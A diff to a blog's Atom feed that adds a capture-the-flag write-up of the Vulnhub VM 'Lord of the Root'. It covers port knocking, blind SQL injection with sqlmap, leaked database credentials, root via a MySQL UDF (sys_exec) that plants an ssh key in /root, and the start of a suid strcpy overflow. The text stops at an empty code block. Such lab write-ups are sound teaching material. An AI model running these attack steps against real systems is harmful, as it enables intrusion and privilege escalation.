@@ -4,7 +4,7 @@
   <title><![CDATA[staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-09-22T23:07:26+02:00</updated>
+  <updated>2015-10-04T11:23:41+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,656 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Lord of the Root]]></title>
+    <link href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/"/>
+    <updated>2015-10-04T10:02:33+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/10/04/lord-of-the-root</id>
+    <content type="html"><![CDATA[<p>I figured I&rsquo;d try another VM from Vulnhub for a change. This is Lord of the Root v1.0.1.</p>
+
+<!--more-->
+
+
+<p><em>Note</em>: Before I could even start the VM with Virtualbox, I had to unpack the .ova, delete the .mf file and remove xml entries from the .ovf file.</p>
+
+<p>The first portscan yielded only ssh as an open port. Upon connecting we get this banner:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh root@192.168.56.101
+</span><span class='line'>
+</span><span class='line'>                                                  .____    _____________________________
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
+</span><span class='line'>                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
+</span><span class='line'>                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
+</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+</span><span class='line'><span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
+</span><span class='line'><span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
+</span><span class='line'><span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
+</span><span class='line'><span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
+</span><span class='line'>        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
+</span><span class='line'>Easy as 1,2,3
+</span><span class='line'>root@192.168.56.101<span class="err">&#39;</span>s password:
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&ldquo;Knock Friend to Enter&rdquo; and &ldquo;Easy as 1,2,3&rdquo; so that has to be port-knocking. I tried to &ldquo;knock&rdquo; with <code>nc</code>, but that didn&rsquo;t work. I hoped the sequence was indeed 1,2,3 so I just used nmap to do it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap -n -T4 -sV -Pn -r 192.168.56.101 -p1,2,3
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-10-04 10:15 CEST
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.56.101
+</span><span class='line'>Host is up.
+</span><span class='line'>PORT  STATE    SERVICE     VERSION
+</span><span class='line'>1/tcp filtered tcpmux
+</span><span class='line'>2/tcp filtered compressnet
+</span><span class='line'>3/tcp filtered compressnet
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And after this, port 1337 was open:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s a webserver that serves a single page. I tried to view robots.txt but was given another picture (two hipster hobbits or something). However, the page source contained <code>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</code>. Let&rsquo;s decode that base64:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&#39;</span> <span class="p">|</span>base64 -d
+</span><span class='line'><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!
+</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;Lzk3ODM0NTIxMC9pbmRleC5waHA=&#39;</span> <span class="p">|</span>base64 -d
+</span><span class='line'>/978345210/index.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>OK so I browsed to that location. It&rsquo;s a login page that is vulnerable to SQLi. I had a hard time finding and exploiting it, because I made a silly mistake. I dumped the database I needed, finally, with this command:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python ./sqlmap.py -u <span class="s2">&quot;http://192.168.56.101:1337/978345210/index.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;username=bleh&amp;password=d&amp;submit= Login &quot;</span> --risk <span class="m">3</span> --level <span class="m">3</span> --dump -D Webapp -t password --dbms<span class="o">=</span>mysql
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In first instance, however, I only used <code>--data "username=bleh&amp;password=d</code>, which prevented SQLmap from finding the SQLi. Note to future self: <em>always</em> include <em>all</em> form parameters!</p>
+
+<p>Anyway, dumping all the data from the db took too long because it was blind SQLi so I just dumped <code>Webapp</code> once I found the database names. Long live SQLmap! This database contained usernames based on Lord of the Rings. I tried logging in to the webpage but couldn&rsquo;t find anything interesting. I tried the five usernames against ssh and struck gold with <code>smeagol:MyPreciousR00t</code>.</p>
+
+<p>From here, there were two ways to root the box: one via a suid binary, one via <code>mysql</code>. I&rsquo;ll start with the SQL route.</p>
+
+<h2>Root via mysql</h2>
+
+<p><code>mysql</code> is running as root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>ps aux <span class="p">|</span>grep sql
+</span><span class='line'>root      <span class="m">1085</span>  2.0  4.2 <span class="m">318220</span> <span class="m">43072</span> ?        Ssl  04:07   0:26 /usr/sbin/mysqld
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s really nice. I grabbed the login from the web source:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>cat /var/www/978345210/login.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span> // Starting Session
+</span><span class='line'><span class="nv">$error</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> // Variable To Store Error Message
+</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;submit&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span> <span class="o">||</span> empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span><span class='line'>      <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Username or Password is invalid&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="o">{</span>
+</span><span class='line'>      // Define <span class="nv">$username</span> and <span class="nv">$password</span>
+</span><span class='line'>      <span class="nv">$username</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$password</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>, <span class="s1">&#39;root&#39;</span>, <span class="s1">&#39;darkshadow&#39;</span>, <span class="s1">&#39;Webapp&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      // To protect MySQL injection <span class="k">for</span> Security purpose
+</span><span class='line'>      <span class="nv">$username</span> <span class="o">=</span> stripslashes<span class="o">(</span><span class="nv">$username</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$password</span> <span class="o">=</span> stripslashes<span class="o">(</span><span class="nv">$password</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nv">$sql</span><span class="o">=</span><span class="s2">&quot;select username, password from Users where username=&#39;&quot;</span>.<span class="nv">$username</span>.<span class="s2">&quot;&#39; AND password=&#39;&quot;</span>.<span class="nv">$password</span>.<span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
+</span><span class='line'>      //echo <span class="nv">$sql</span><span class="p">;</span>
+</span><span class='line'>                <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$db</span>-&gt;query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>                <span class="nv">$rows</span> <span class="o">=</span> <span class="nv">$query</span>-&gt;num_rows<span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="o">(</span><span class="nv">$rows</span> <span class="o">==</span> 1<span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>          <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;login_user&#39;</span><span class="o">]=</span><span class="nv">$username</span><span class="p">;</span> // Initializing Session
+</span><span class='line'>          header<span class="o">(</span><span class="s2">&quot;location: profile.php&quot;</span><span class="o">)</span><span class="p">;</span> // Redirecting To Other Page
+</span><span class='line'>      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span><span class='line'>          <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Username or Password is invalid&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="o">}</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>?&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can now login to <code>mysql</code> as root and upload <code>lib_mysqludf_sys</code> to enable command execution. I ripped parts from my <a href="https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/">Kvasir</a> writeup. I cloned the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a> repo and ran the following commands:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="s2">&quot;SELECT 0x&quot;</span> &gt; payload
+</span><span class='line'>cat lib_mysqludf_sys.so <span class="p">|</span>xxd -p &gt;&gt; payload
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf_exploit.so&#39;; &quot;</span> &gt;&gt; payload
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>payload</code> was ran through <code>tr -d '\n'</code> to remove newlines and the output of that command was entered into the mysql prompt. This creates the <code>udf_exploit.so</code> file on the remote box. From there, I ran:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql&gt; CREATE FUNCTION sys_exec RETURNS int SONAME <span class="s1">&#39;udf_exploit.so&#39;</span><span class="p">;</span>
+</span><span class='line'>Query OK, <span class="m">0</span> rows affected <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I created ssh keys for this joyous occasion and upload the public key to the root directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql&gt; SELECT <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhzEQ1uE0pjtDVHQZg17PP1rihY0ju7u0fBSJax/oAfxWXia9e229BpW+P6U08zEE4FhnhKdy4Tqyz8sdqwiPFldi8MkzA68oWBP5QwwGBF+CGrsQ7b8CLDSESPOKMx8uTz71OJObHRzC6Vtuhe9CD3unoTw5i1XNRq/Hl3Zm/BaYQB9yQMA6FoE7qt8UhZS1uis9EsNGvUSvYdrRUM7XiWEsml6Q9EGFs0jVZn/UGCr4rD/t0yqNtAKtH+9j2GRbh2pKTynfFXuHTzzODtiHzbEfmO/ma4B2gcyEzj+FBHxhwZAWQ349Fy/m1oDUJsbnk+tlLbdbPoDOTeS1nOAzD&quot;</span> INTO OUTFILE <span class="s1">&#39;/root/.ssh/autorized_keys&#39;</span><span class="p">;</span>
+</span><span class='line'>Query OK, <span class="m">1</span> row affected <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>mysql&gt; SELECT sys_exec<span class="o">(</span><span class="s2">&quot;chmod 600 /root/.ssh/authorized_keys&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>+--------------------------------------------------+
+</span><span class='line'><span class="p">|</span> sys_exec<span class="o">(</span><span class="s2">&quot;chmod 600 /root/.ssh/authorized_keys&quot;</span><span class="o">)</span> <span class="p">|</span>
+</span><span class='line'>+--------------------------------------------------+
+</span><span class='line'><span class="p">|</span>                                                <span class="m">0</span> <span class="p">|</span>
+</span><span class='line'>+--------------------------------------------------+
+</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I could ssh in as root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh root@192.168.56.101 -i ./rootkey
+</span><span class='line'>
+</span><span class='line'>                                                  .____    _____________________________
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
+</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
+</span><span class='line'>                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
+</span><span class='line'>                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
+</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+</span><span class='line'><span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
+</span><span class='line'><span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
+</span><span class='line'><span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
+</span><span class='line'><span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
+</span><span class='line'>        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
+</span><span class='line'>Easy as 1,2,3
+</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>
+</span><span class='line'>                            .____    _____________________________
+</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\ </span>
+</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
+</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\ </span>
+</span><span class='line'>                            <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
+</span><span class='line'>                                    <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
+</span><span class='line'> __      __       .__                                ___________      .__                   .___
+</span><span class='line'>/  <span class="se">\ </span>   /  <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span>   ____  ____   _____   ____   <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/
+</span><span class='line'><span class="se">\ </span>  <span class="se">\/\/</span>   // __ <span class="se">\|</span>  <span class="p">|</span> _/ ___<span class="se">\/</span>  _ <span class="se">\ </span>/     <span class="se">\_</span>/ __ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>
+</span><span class='line'> <span class="se">\ </span>       /<span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>_<span class="se">\ </span> <span class="se">\_</span>_<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> ___/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>
+</span><span class='line'>  <span class="se">\_</span>_/<span class="se">\ </span> /  <span class="se">\_</span>__  &gt;____/<span class="se">\_</span>__  &gt;____/<span class="p">|</span>__<span class="p">|</span>_<span class="p">|</span>  /<span class="se">\_</span>__  &gt;  <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>
+</span><span class='line'>       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
+</span><span class='line'>Last login: Sun Oct  <span class="m">4</span> 04:38:51 <span class="m">2015</span> from 192.168.56.1
+</span><span class='line'>root@LordOfTheRoot:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So that&rsquo;s the <code>mysql</code> route. Now on to the binary!</p>
+
+<h2>Vulnerable binary</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>find / -perm -4000 -type f 2&gt;/dev/null
+</span><span class='line'>/bin/fusermount
+</span><span class='line'>/bin/su
+</span><span class='line'>/bin/mount
+</span><span class='line'>/bin/ping
+</span><span class='line'>/bin/umount
+</span><span class='line'>/bin/ping6
+</span><span class='line'>/SECRET/door2/file
+</span><span class='line'>/SECRET/door1/file
+</span><span class='line'>/SECRET/door3/file
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ah, interesting. This reminds me of knock-knock.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>md5sum /SECRET/door*/file
+</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door1/file
+</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door2/file
+</span><span class='line'>bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door3/file
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I grabbed <code>door3</code> and started analysing it on my local box. It contains a <code>strcpy</code> that allows us to control EIP.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
